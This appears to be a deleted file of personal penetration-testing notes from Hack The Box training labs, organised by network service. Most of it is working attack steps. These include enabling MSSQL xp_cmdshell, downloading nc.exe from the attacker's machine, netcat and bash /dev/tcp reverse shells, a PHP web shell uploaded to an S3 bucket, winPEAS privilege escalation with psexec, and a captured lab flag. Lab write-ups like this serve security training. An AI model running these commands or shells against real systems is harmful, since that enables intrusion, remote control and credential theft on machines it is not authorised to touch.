@ -1,161 +0,0 @@
nmap -sC -sV {ip}

telnet
23/tcp  telnet
tool: telnet 
login (bruteforce)
accsess directory

ftp (file transfer protocol)
21/tcp ftp
tool: ftp
login anonymous
access directory
get to download file
put to upload file

SMB (server message block)
445/tcp open  microsoft-ds?
tool: smbclient
check hosts
smbclient -L {IP}
hosts :
ADMIN$ - Administrative shares are hidden network shares created by the Windows NT family of
operating systems that allow system administrators to have remote access to every disk volume on a
network-connected system. These shares may not be permanently deleted but may be disabled.
C$ - Administrative share for the C:\ disk volume. This is where the operating system is hosted.
IPC$ - The inter-process communication share. Used for inter-process communication via named
pipes and is not part of the file system.
WorkShares - Custom share.

try to connect execpt IPC$
smbclient \\\\{IP}\\{host}
explore avaiable directory
get to download

3306/tcp open  mysql 
mysql port
sudo apt update && sudo apt install mysql*
connect to database
-h : Connect to host.
-u : User for log-in if not current user.
-p : if password exist
mysql -h {ip} -u (user)
mariadb commands
SHOW databases; : Prints out the databases we can access.
USE {database_name}; : Set to use the database named {database_name}.
SHOW tables; : Prints out the available tables inside the current
database.
SELECT * FROM {table_name}; : Prints out all the data from the table {table_name}.
find intrestings data

1433/tcp ms-sql-s
login db
impacket-mssqlclient {user id}@{ip} -windows-auth
masuk admin
SELECT is_srvrolemember('sysadmin');
buka shell
EXECUTE sp_configure 'show advanced options',1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell',1;
RECONFIGURE;
tes shell
xp_cmdshell "whoami"
download https://github.com/int0x33/nc.exe/blob/master/nc.exe
setup python server in the folder with the nc.exe
python3 -m http.server
find tun0 ip using ifconfig tun0
get the file from system target
xp_cmdshell "powershell.exe wget http://[Your_tun0_IP]:8000/nc.exe -OutFile c:\\Users\Public\\nc.exe"
if it success this will show
┌──(pandora㉿Dora)-[~/htb/archtype]
└─$ python3 -m http.server                                                                                                                         
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.75.177 - - [25/Apr/2024 03:45:21] "GET /nc.exe HTTP/1.1" 200 -
listen to port with netcat on different terminal
nc -lvnp 4444
run shell on target server
xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 10.10.14.19 4444"
see the shell on listener terminal
how to open root?
using winpeas tool, download here https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
setup python server
python3 -m http.server
plant the winpeas in user target server with powershell 
powershell
wget http://10.10.14.19:8000/winPEASx64.exe -outfile winPEASx64.exe
run winpeas ./winPEASx64.exe
find admin credential
after admin credential found, kill the powershell and mssqlclient
use impacket-psexec tool to login administrator
impacket-psexec administrator@{ip}
now you are an admin


80/tcp HTTP (Apache HTTPD)
this mean IP avaiable in web browser and can perform web exploit hack.

5985/tcp (HTTP)
Windows Remote Management, or WinRM
→ Remotely communicate and interface with hosts
→ Execute commands remotely on systems that are not local to you but are network accessible.
→ Monitor, manage and configure servers, operating systems and client machines from a remote location.

22/tcp ssh

adding host entry
add an entry for {link} in the /etc/hosts file with the corresponding IP address to be able
to access this domain in our browser.
echo "{ip} {link}" | sudo tee -a /etc/hosts


6379/tcp REDIS SERVER (REmote DIctionary Server)
	redis-cli -h {target_IP}
	info #Mengecek info server

		# Keyspace (ADA DI INFO)
		db0:keys=4,expires=0,avg_ttl=0 #HANYA ADA 1 DATABASE DENGAN INDEX 0, CEK AJA

	select 0 #MEMILIH DATABASE DENGAN INDEX 0
	keys *   #MELIHAT SEMUA KEYS YANG ADA DI DATABASE
		1) "flag"_allocated:1570200
		2) "temp"_active:1892352
		3) "stor"_resident:9101312
		4) "numb"tem_memory:2084024320
	get flag (get <key>) #MELIHAT VALUES DARI KEYS
		"03e1d2b376c37ab3f5319922053953eb"
		(1.03s)mory_lua_human:41.00K



gobuster
vhost : Uses VHOST for brute-forcing
-w : Path to the wordlist
-u : Specify the URL

s3 subdomain
https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html
We can interact with this S3 bucket with the aid of the awscli utility. It can be installed on Linux using the
sudo apt install awscli 
aws configure

send shell
create php shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
upload shell
aws --endpoint=http://{link} s3 cp shell.php s3://{link}
check shell
try executing the OS command id using the URL parameter cmd

reverse shell
create shell.ssh
bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
listen port to port with netcat
nc -nvlp 1337

start webserver
python3 -m http.server 8000


LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not
intended to be an option for this application. A common example is when an application uses the path to a
file as input. If the application treats this input as trusted, and the required sanitary checks are not
performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name
and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote
file on the host using protocols like HTTP, FTP etc.
execution as well.

NTLM (New Technology Lan Manager)
The NTLM authentication process is done in the following way :
1. The client sends the user name and domain name to the server.
2. The server generates a random character string, referred to as the challenge.
3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the
server.
4. The server retrieves the user password (or equivalent).
5. The server uses the hash value retrieved from the security account database to encrypt the challenge
string. The value is then compared to the value received from the client. If the values match, the client
is authenticated

Name-Based Virtual hosting
